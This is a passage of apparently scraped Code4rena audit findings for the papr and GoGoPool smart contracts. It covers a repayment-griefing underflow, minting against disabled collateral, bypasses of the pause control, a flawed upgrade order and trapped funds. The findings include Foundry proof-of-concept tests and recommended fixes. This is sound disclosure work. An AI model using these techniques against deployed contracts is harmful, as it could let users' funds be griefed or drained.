Alice, so Alice's debt becomes `1000 * 10**18 - 1`. ``` function _reduceDebt(address account, ERC721 asset, address burnFrom, uint256 amount) internal {         _reduceDebtWithoutBurn(account, asset, amount);         PaprToken(address(papr)).burn(burnFrom, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481 ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486  - Then, when Alice's transaction is going to be executed, it fails because of `Underflow Error`. Since Alice's debt is `1000 * 10**18 - 1` while Alice's transaction was going to repay `1000 * 10**18`. ``` _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount); ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487  - Bob only pays a very small value of 1 `PaprToken` (consider that the decimal is 18) to apply this grieving attack.  - Bob can repeat this attack for Alice, if Alice is going to call this function again with correct parameter.  ***In summary, Bob could prevent the user from paying her debt fully by just repaying a very small amount of the user's debt in advance and as a result causing underflow error. Bob can apply this attack for all other users who are going to repay their debt fully. Please note that if a user is going to repay her debt partially, the attack can be expensive and not financially reasonable, but in case of full repayment of debt, it is very cheap to apply this grieving attack.***  ***This attack can be applied on the transactions that are going to interact with the function `_reduceDebt`. The transactions interacting with this specific function are:***  - `buyAndReduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229  - `reduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149  ***It means that the attacker can prevent users from calling the functions above.***  ## Tools Used  ## Recommended Mitigation Steps The following condition should be added to the function `_reduceDebtWithoutBurn`: ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         if(amount > _vaultInfo[account][asset].debt){             amount = _vaultInfo[account][asset].debt;         }         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486"}, {"title": "Disabled NFT collateral should not be used to mint debt", "html_url": "https://github.com/code-423n4/2022-12-backed-findings/issues/91", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-12-backed-findings", "body": "# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138   # Vulnerability details  ## Impact  Disabled collateral can still be used to mint debt  ## Proof of Concept  There is a access control function in PaprController.sol  ```solidity /// @inheritdoc IPaprController function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)  external  override  onlyOwner { ```  According to IPaprController, if the collateral is disabled set to false, the user should not be allowed to mint debt using the collateral,  ```solidity /// @notice sets whether a collateral is allowed to be used to mint debt /// @dev owner function /// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs) external; ```  However, the code only checks if the collateral is allowed when adding collateral,   ```solidity function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {  if (!isAllowed[address(collateral.addr)]) {   revert IPaprController.InvalidCollateral();  } ```  but does not have the same check when minting debt, then user can use diabled collateral to mint debt.  ```solidity function _increaseDebt(  address account,  ERC721 asset,  address mintTo,  uint256 amount,  ReservoirOracleUnderwriter.OracleInfo memory oracleInfo ) internal {  uint256 cachedTarget = updateTarget();   uint256 newDebt = _vaultInfo[account][asset].debt + amount;  uint256 oraclePrice =   underwritePriceForCollateral(asset, ReservoirOracleUnderwriter.PriceKind.LOWER, oracleInfo);   uint256 max = _maxDebt(_vaultInfo[account][asset].count * oraclePrice, cachedTarget);   if (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);   if (newDebt >= 1 << 200) revert IPaprController.DebtAmountExceedsUint200();   _vaultInfo[account][asset].debt = uint200(newDebt);  PaprToken(address(papr)).mint(mintTo, amount);   emit IncreaseDebt(account, asset, amount); } ```  As shown in the coded POC  We can add the following test to increaseDebt.t.sol  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32  ```solidity function testIncreaseDebt_POC() public {   uint256 debt = 10 ether;  // console.log(debt);   vm.assume(debt < type(uint200).max);  vm.assume(debt < type(uint256).max / controller.maxLTV() / 2);   oraclePrice = debt * 2;  oracleInfo = _getOracleInfoForCollateral(nft, underlying);    vm.startPrank(borrower);  nft.approve(address(controller), collateralId);  IPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);  c[0] = collateral;   controller.addCollateral(c);   // disable the collateral but still able to mint debt  IPaprController.CollateralAllowedConfig[] memory args = new IPaprController.CollateralAllowedConfig[](1);  args[0] = IPaprController.CollateralAllowedConfig({   collateral: address(collateral.addr),   allowed: false  });   vm.stopPrank();   vm.prank(controller.owner());  controller.setAllowedCollateral(args);   vm.startPrank(borrower);   controller.increaseDebt(borrower, collateral.addr, debt, oracleInfo);  assertEq(debtToken.balanceOf(borrower), debt);  assertEq(debt, controller.vaultInfo(borrower, collateral.addr).debt); } ```  We disable the collateral but still able to mint debt by calling increaseDebt  We run the test   ```solidity forge test -vvv --match testIncreaseDebt_POC ```  The test pass, but the test should revert.  ``` Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest [PASS] testIncreaseDebt_POC() (gas: 239301) Test result: ok. 1 passed; 0 failed; finished in 237.42ms ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project add check to make sure when the collateral is disabled, the collateral should not be used to mint debt  ```solidity if (!isAllowed[address(collateral.addr)]) {  revert IPaprController.InvalidCollateral(); } ```"}, {"title": "RewardsPool.sol : It is safe to have the startRewardsCycle with WhenNotPaused modifier", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/823", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-01"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L155-L197   # Vulnerability details  ## Impact when the contract is paused , allowing startRewardsCycle would inflate the token value which might not be safe.  Rewards should not be claimed by anyone when all other operations are paused.  I saw that the `witdrawGGP` has this `WhenNotPaused` modifier.  Inflate should not consider the paused duration.  lets say, when the contract is paused for theduration of 2 months, then the dao, protocol, and node validator would enjoy the rewards. This is not good for a health protocol  ## Proof of Concept  startRewardsCycle does not have the WhenNotPaused modifier.   function startRewardsCycle() external {   if (!canStartRewardsCycle()) {    revert UnableToStartRewardsCycle();   }     emit NewRewardsCycleStarted(getRewardsCycleTotalAmt());     // Set start of new rewards cycle   setUint(keccak256(\"RewardsPool.RewardsCycleStartTime\"), block.timestamp);   increaseRewardsCycleCount();   // Mint any new tokens from GGP inflation   // This will always 'mint' (release) new tokens if the rewards cycle length requirement is met   //   since inflation is on a 1 day interval and it needs at least one cycle since last calculation   inflate();     uint256 multisigClaimContractAllotment = getClaimingContractDistribution(\"ClaimMultisig\");   uint256 nopClaimContractAllotment = getClaimingContractDistribution(\"ClaimNodeOp\");   uint256 daoClaimContractAllotment = getClaimingContractDistribution(\"ClaimProtocolDAO\");   if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {    revert IncorrectRewardsDistribution();   }     TokenGGP ggp = TokenGGP(getContractAddress(\"TokenGGP\"));   Vault vault = Vault(getContractAddress(\"Vault\"));     if (daoClaimContractAllotment > 0) {    emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);    vault.transferToken(\"ClaimProtocolDAO\", ggp, daoClaimContractAllotment);   }     if (multisigClaimContractAllotment > 0) {    emit MultisigRewardsTransfered(multisigClaimContractAllotment);    distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);   }     if (nopClaimContractAllotment > 0) {    emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);    ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress(\"ClaimNodeOp\"));    nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);    vault.transferToken(\"ClaimNodeOp\", ggp, nopClaimContractAllotment);   }  }  ## Tools Used  Manual review  ## Recommended Mitigation Steps  We suggest to use `WhenNotPaused` modifier."}, {"title": "Coding logic of the contract upgrading renders upgrading contracts impractical", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/742", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-02"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216   # Vulnerability details   ## Impact  [Link to original code](https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216) ```solidity File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol  205 /// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name  /// @param newAddr Address of the new contract  /// @param newName Name of the new contract  /// @param existingAddr Address of the existing contract to be deleted 209 function upgradeExistingContract(    address newAddr,    string memory newName,    address existingAddr   ) external onlyGuardian {    registerContract(newAddr, newName);    unregisterContract(existingAddr); 216 } ```  Function `ProtocolDAO.upgradeExistingContract` handles contract upgrading. However, there are multiple implicaitons of the coding logic in the function, which render the contract upgrading impractical.  **Implication 1**: The above function `upgradeExistingContract` registers the upgraded contract first, then unregisters the existing contract. This leads to the requirement that the upgraded contract name **must be different from** the existing contract name. Otherwise the updated contract address returned by `Storage.getAddress(keccak256(abi.encodePacked(\"contract.address\", contractName)))` will be `address(0)` (please refer to the below POC Testcase 1). This is because if the upgraded contract uses the original name (i.e. the contract name is not changed), function call  `unregisterContract(existingAddr)` in the `upgradeExistingContract` will override the registered contract address in `Storage` to address(0) due to the use of the same contract name.  Since using the same name after upgrading will run into trouble with current coding logic, a safeguard should be in place to make sure two names are really different. For example, put this statement in the `upgradeExistingContract` function:  `require(newName != existingName, \"Name not changed\");`, where `existingName` can be obtained using:  `string memory existingName = store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr)));`.  **Implication 2**: If we really want a different name for an upgraded contract, we then get into more serious troubles: We have to upgrade other contracts that reference the upgraded contract since contract names are referenced mostly hardcoded (for security considerations). This may lead to a very complicated issue because contracts are cross-referenced. For example, contract `ClaimNodeOp` references contracts `RewardsPool`, `ProtocolDAO` and `Staking`. At the same time, contract `ClaimNodeOp` is referenced by contracts `RewardsPool` and `Staking`. This means that: 1. If contract `ClaimNodeOp` was upgraded, which means the contract name `ClaimNodeOp` was changed; 2. This requires contracts `RewardsPool` and `Staking` to be upgraded (with new names) in order to correctly reference to newly named `ClaimNodeOp` contract; 3. This further requires those contracts that reference `RewardsPool` or `Staking` to be upgraded in order to correctly reference them; 4. and this further requires those contracts that reference the above upgraded contracts to be upgraded ... 5. This may lead to complicated code management issue and expose new vulnerabilites due to possible incomplete code adaptation. 6. This may render the contracts upgrading impractical.  I rate this issue as high severity due to the fact that: Contract upgradability is one of the main features of the whole system design (all other contracts are designed upgradable except for `TokenGGP`, `Storage` and `Vault` ). However, the current `upgradeExistingContract` function's coding logic requires the upgraded contract must change its name (refer to the below Testcase 1). This inturn requires to upgrade all relevant cross-referenced contracts (refer to the below Testcase 2). Thus leading to a quite serous code management issue while upgrading contracts, and renders upgrading contracts impractical.   ## Proof of Concept  **Testcase 1**: This testcase demonstrates that current coding logic of upgrading contracts requires: **the upgraded contract must change its name**. Otherwise contract upgrading will run into issue. Put the below test case in file `ProtocolDAO.t.sol`. The test case demonstrates that `ProtocolDAO.upgradeExistingContract` does not function properly if the upgraded contract does not change the name. That is: the upgraded contract address returned by `Storage.getAddress(keccak256(abi.encodePacked(\"contract.address\", contractName)))` will be `address(0)` if its name unchanged. ```solidity  function testUpgradeExistingContractWithNameUnchanged() public {   address addr = randAddress();   string memory name = \"existingName\";    address existingAddr = randAddress();   string memory existingName = \"existingName\";    vm.prank(guardian);   dao.registerContract(existingAddr, existingName);   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), existingAddr);   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), existingName);    vm.prank(guardian);   //@audit upgrade contract while name unchanged   dao.upgradeExistingContract(addr, name, existingAddr);   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", addr))), true);   //@audit the registered address was deleted by function call `PtotocolDAO.unregisterContract(existingAddr)`   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", name))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", addr))), name);                 //@audit verify that the old contract has been de-registered   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), false);   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), \"\");  } ```  **Testcase 2**: This testcase demonstrates that current coding logic of upgrading contracts requires: **in order to upgrade a single contract, all cross-referenced contracts have to be upgraded and change their names**. Otherwise, other contracts will run into issues. If the upgraded contract does change its name, contract upgrading will succeed. However, other contracts' functions that reference the upgraded contract will fail due to referencing hardcoded contract name.  The below testcase upgrades contract `ClaimNodeOp` to `ClaimNodeOpV2`. Then, contract `Staking` calls `increaseGGPRewards` which references hardcoded contract name `ClaimNodeOp` in its modifier. The call is failed.  Test steps: 1. Copy contract file `ClaimNodeOp.sol` to `ClaimNodeOpV2.sol`, and rename the contract name from `ClaimNodeOp` to `ClaimNodeOpV2` in file  `ClaimNodeOpV2.sol`; 2. Put the below test file `UpgradeContractIssue.t.sol` under folder `test/unit/`; 3. Run the test. **Note**: In order to test actual function call after upgrading contract, this testcase upgrades a real contract `ClaimNodeOp`. This is different from the above Testcase 1 which uses a random address to simulate a contract. ```solidity // File: UpgradeContractIssue.t.sol // SPDX-License-Identifier: GPL-3.0-only pragma solidity 0.8.17;  import \"./utils/BaseTest.sol\"; import {ClaimNodeOpV2} from \"../../contracts/contract/ClaimNodeOpV2.sol\"; import {BaseAbstract} from \"../../contracts/contract/BaseAbstract.sol\";  contract UpgradeContractIssueTest is BaseTest {  using FixedPointMathLib for uint256;   address private nodeOp1;   uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;   function setUp() public override {   super.setUp();    nodeOp1 = getActorWithTokens(\"nodeOp1\", MAX_AMT, MAX_AMT);   vm.prank(nodeOp1);   ggp.approve(address(staking), MAX_AMT);   fundGGPRewardsPool();  }   function fundGGPRewardsPool() public {   // guardian is minted 100% of the supply   vm.startPrank(guardian);   uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);   ggp.approve(address(vault), rewardsPoolAmt);   vault.depositToken(\"RewardsPool\", ggp, rewardsPoolAmt);   vm.stopPrank();  }   function testUpgradeExistingContractWithNameChanged() public {      vm.prank(nodeOp1);   staking.stakeGGP(10 ether);                  //@audit increase GGPRewards before upgrading contract - succeed   vm.prank(address(nopClaim));   staking.increaseGGPRewards(address(nodeOp1), 10 ether);   assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);    //@audit Start to upgrade contract ClaimNodeOp to ClaimNodeOpV2      vm.startPrank(guardian);   //@audit upgrad contract   ClaimNodeOpV2 nopClaimV2 = new ClaimNodeOpV2(store, ggp);   address addr = address(nopClaimV2);   //@audit contract name must be changed due to the limitation of `upgradeExistingContract` coding logic   string memory name = \"ClaimNodeOpV2\";    //@audit get existing contract ClaimNodeOp info   address existingAddr = address(nopClaim);   string memory existingName = \"ClaimNodeOp\";      //@audit the existing contract should be already registered. Verify its info.   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), existingAddr);   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), existingName);                  //@audit Upgrade contract   dao.upgradeExistingContract(addr, name, existingAddr);      //@audit verify that the upgraded contract has correct contract info registered   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", addr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", name))), addr);   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", addr))), name);    //@audit verify that the old contract has been de-registered   assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), false);   assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), \"\");   vm.stopPrank();    vm.prank(nodeOp1);   staking.stakeGGP(10 ether);                  //@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2   vm.prank(address(nopClaimV2)); //@audit using the upgraded contract   vm.expectRevert(BaseAbstract.InvalidOrOutdatedContract.selector);   //@audit revert due to contract Staking using hardcoded contract name \"ClaimNodeOp\" in the modifier   staking.increaseGGPRewards(address(nodeOp1), 10 ether);  } }  ```  ## Tools Used Manual code review  ## Recommended Mitigation Steps  1. Upgrading contract does not have to change contranct names especially in such a complicated system wherein contracts are cross-referenced in a hardcoded way. I would suggest not to change contract names when upgrading contracts. 2. In function `upgradeExistingContract` definition, swap fucnction call sequence between `registerContract()` and `unregisterContract()` so that contract names can keep unchanged after upgrading. That is, the modified function would be: ```solidity File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol  205 /// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name  /// @param newAddr Address of the new contract  /// @param newName Name of the new contract  /// @param existingAddr Address of the existing contract to be deleted 209 function upgradeExistingContract(    address newAddr,    string memory newName,  //@audit this `newName` parameter can be removed if upgrading don't change contract name    address existingAddr   ) external onlyGuardian {     unregisterContract(existingAddr);  //@audit unregister the existing contract first   registerContract(newAddr, newName);  //@audit then register the upgraded contract 216 } ```  **POC of Mitigation**:  After the above recommended mitigation, the below Testcase vefifies that after upgrading contracts, other contract's functions, which reference the hardcoded contract name, can still opetate correctly.  1. Make the above recommended mitigation in function `ProtocolDAO.upgradeExistingContract`; 2. Put the below test file `UpgradeContractImproved.t.sol` under folder `test/unit/`; 3. Run the test. **Note**: Since we don't change the upgraded contract name, for testing purpose, we just need to create a new contract instance (so that the contract instance address is changed) to simulate the contract upgrading. ```solidity  // File: UpgradeContractImproved.t.sol  // SPDX-License-Identifier: GPL-3.0-only  pragma solidity 0.8.17;   import \"./utils/BaseTest.sol\";  import {ClaimNodeOp} from \"../../contracts/contract/ClaimNodeOp.sol\";  import {BaseAbstract} from \"../../contracts/contract/BaseAbstract.sol\";   contract UpgradeContractImprovedTest is BaseTest {   using FixedPointMathLib for uint256;    address private nodeOp1;    uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;    function setUp() public override {    super.setUp();     nodeOp1 = getActorWithTokens(\"nodeOp1\", MAX_AMT, MAX_AMT);    vm.prank(nodeOp1);    ggp.approve(address(staking), MAX_AMT);    fundGGPRewardsPool();   }    function fundGGPRewardsPool() public {    // guardian is minted 100% of the supply    vm.startPrank(guardian);    uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);    ggp.approve(address(vault), rewardsPoolAmt);    vault.depositToken(\"RewardsPool\", ggp, rewardsPoolAmt);    vm.stopPrank();   }    function testUpgradeContractCorrectlyWithNameUnChanged() public {    //@audit increase GGPRewards before upgrading contract - no problem    vm.prank(nodeOp1);    staking.stakeGGP(10 ether);     vm.prank(address(nopClaim));    staking.increaseGGPRewards(address(nodeOp1), 10 ether);    assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);     //@audit Start to upgrade contract ClaimNodeOp    vm.startPrank(guardian);    //@audit upgraded contract by creating a new contract instance    ClaimNodeOp nopClaimV2 = new ClaimNodeOp(store, ggp);    address addr = address(nopClaimV2);    //@audit contract name is not changed!    string memory name = \"ClaimNodeOp\";     //@audit get existing contract info    address existingAddr = address(nopClaim);    string memory existingName = \"ClaimNodeOp\";     //@audit new contract address is different from the old one    assertFalse(addr == existingAddr);        //@audit the existing contract should be already registered. Verify its info.    assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), true);    assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), existingAddr);    assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), existingName);                          //@audit Upgrade contract    dao.upgradeExistingContract(addr, name, existingAddr);        //@audit verify the upgraded contract has correct contract info registered    assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", addr))), true);    assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", name))), addr);    assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", addr))), name);     //@audit verify that the old contract has been de-registered    assertEq(store.getBool(keccak256(abi.encodePacked(\"contract.exists\", existingAddr))), false);    assertEq(store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr))), \"\");    //@audit The contract has new address now. Note that: existingName == name    assertEq(store.getAddress(keccak256(abi.encodePacked(\"contract.address\", existingName))), addr);    vm.stopPrank();     //@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2    vm.prank(nodeOp1);    staking.stakeGGP(10 ether);     vm.prank(address(nopClaimV2)); //@audit using the new contract    //@audit Successfully call the below function with hardcoded contract name \"ClaimNodeOp\" in the modifier    staking.increaseGGPRewards(address(nodeOp1), 10 ether);    //@audit Successfully increased!    assert(staking.getGGPRewards(address(nodeOp1)) == 20 ether);   }  }  ``` "}, {"title": "NodeOp funds may be trapped by a invalid state transition", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/723", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-03"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L287   # Vulnerability details  ## Impact  The Multisig can call ```MinipoolManager.sol::recordStakingError()``` if there is an error while registering the node as a validator. Also the Multisig can call [MinipoolManager.sol::finishFailedMinipoolByMultisig()](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528) in order to \"finish\" the NodeOp's minipool proccess.  If the Multisig accidentally/intentionally calls ```recordStakingError()``` then ```finishFailedMinipoolByMultisig()``` the NodeOp funds may be trapped in the protocol.  The ```finishFailedMinipoolByMultisig()``` has the next comment: *Multisig can move a minipool from the error state to the finished state after a human review of the error* but the NodeOp should be able to withdraw his funds after a finished minipool.  ## Proof of Concept  I created a test for this situation in ```MinipoolManager.t.sol```. At the end you can observe that the ```withdrawMinipoolFunds()``` reverts with ```InvalidStateTransition``` error:  1. NodeOp creates the minipool 2. Rialto calls claimAndInitiateStaking 3. Something goes wrong and Rialto calls recordStakingError() 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order to finish the NodeOp's minipool 5. The NodeOp can not withdraw his funds. The withdraw function reverts with InvalidStateTransition() error  ```solidity function testUserFundsStuckErrorFinished() public {     // NodeOp funds may be trapped by a invalid state transition     // 1. NodeOp creates the minipool     // 2. Rialto calls claimAndInitiateStaking     // 3. Something goes wrong and Rialto calls recordStakingError()     // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order      // to finish the NodeOp's minipool     // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with     // InvalidStateTransition() error     //     // 1. Create the minipool by the NodeOp     //     address liqStaker1 = getActorWithTokens(\"liqStaker1\", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();     assertEq(liqStaker1.balance, 0);     uint256 duration = 2 weeks;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 200 ether;     vm.startPrank(nodeOp);     ggp.approve(address(staking), ggpStakeAmt);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();     assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt);     //     // 2. Rialto calls claimAndInitiateStaking     //     vm.startPrank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp.nodeID);     assertEq(vault.balanceOf(\"MinipoolManager\"), 0);     //     // 3. Something goes wrong and Rialto calls recordStakingError()     //     bytes32 errorCode = \"INVALID_NODEID\";     minipoolMgr.recordStakingError{value: validationAmt}(mp.nodeID, errorCode);     // NodeOps funds should be back in vault     assertEq(vault.balanceOf(\"MinipoolManager\"), depositAmt);     // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order      // to finish the NodeOp's minipool     minipoolMgr.finishFailedMinipoolByMultisig(mp.nodeID);     vm.stopPrank();     // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with     // InvalidStateTransition() error     vm.startPrank(nodeOp);     vm.expectRevert(MinipoolManager.InvalidStateTransition.selector);     minipoolMgr.withdrawMinipoolFunds(mp.nodeID);     vm.stopPrank(); } ```  ## Tools used  Foundry/Vscode  ## Recommended Mitigation Steps  The ```withdrawMinipoolFunds``` could add another [requireValidStateTransition](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#LL290C3-L290C30) in order to allow the withdraw after the finished minipoool."}, {"title": "Bypass `whenNotPaused` modifier", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/673", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "fix security (sponsor)", "M-05"], "target": "2022-12-gogopool-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328-L332 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89-L114 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimProtocolDAO.sol#L20-L35   # Vulnerability details  ## Impact  The `whenNotPaused` modifier is used to pause minipool creation and staking/withdrawing GGP. However, there are several cases this modifier could be bypassed, which breaks the intended admin control function and special mode.   ## Proof of Concept  ### `stake()`  In paused mode, no more `stakeGGP()` is allowed,  ```solidity File: contract/Staking.sol 319:  function stakeGGP(uint256 amount) external whenNotPaused { 320:   // Transfer GGP tokens from staker to this contract 321:   ggp.safeTransferFrom(msg.sender, address(this), amount); 322:   _stakeGGP(msg.sender, amount); 323:  } ```  However, `restakeGGP()` is still available, which potentially violate the purpose of pause mode. ```solidity File: contract/Staking.sol 328:  function restakeGGP(address stakerAddr, uint256 amount) public onlySpecificRegisteredContract(\"ClaimNodeOp\", msg.sender) { 329:   // Transfer GGP tokens from the ClaimNodeOp contract to this contract 330:   ggp.safeTransferFrom(msg.sender, address(this), amount); 331:   _stakeGGP(stakerAddr, amount); 332:  } ```  ### `withdraw()`  In paused mode, no more `withdrawGGP()` is allowed,  ```solidity File: contract/Staking.sol 358:  function withdrawGGP(uint256 amount) external whenNotPaused {  373:   vault.withdrawToken(msg.sender, ggp, amount); ```  However, `claimAndRestake()` is still available, which can withdraw from the vault. ```solidity File: contract/ClaimNodeOp.sol 089:  function claimAndRestake(uint256 claimAmt) external {  103:   if (restakeAmt > 0) { 104:    vault.withdrawToken(address(this), ggp, restakeAmt); 105:    ggp.approve(address(staking), restakeAmt); 106:    staking.restakeGGP(msg.sender, restakeAmt); 107:   } 108:  109:   if (claimAmt > 0) { 110:    vault.withdrawToken(msg.sender, ggp, claimAmt); 111:   } ```  THe function `spend()` can also ignore the pause mode to withdraw from the vault. But this is a guardian function. It could be intended behavior. ```solidity File: contract/ClaimProtocolDAO.sol 20:  function spend( 21:   string memory invoiceID, 22:   address recipientAddress, 23:   uint256 amount 24:  ) external onlyGuardian {  32:   vault.withdrawToken(recipientAddress, ggpToken, amount); ```    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - add the `whenNotPaused` modifier to `restakeGGP()` and `claimAndRestake()` - maybe also for guardian function `spend()`."}, {"title": "Rialto may not be able to cancel minipools created by contracts that cannot receive AVAX", "html_url": "https://github.com/code-423n4/2022-12-gogopool-findings/issues/623", "labels": ["bug", "2 (Med 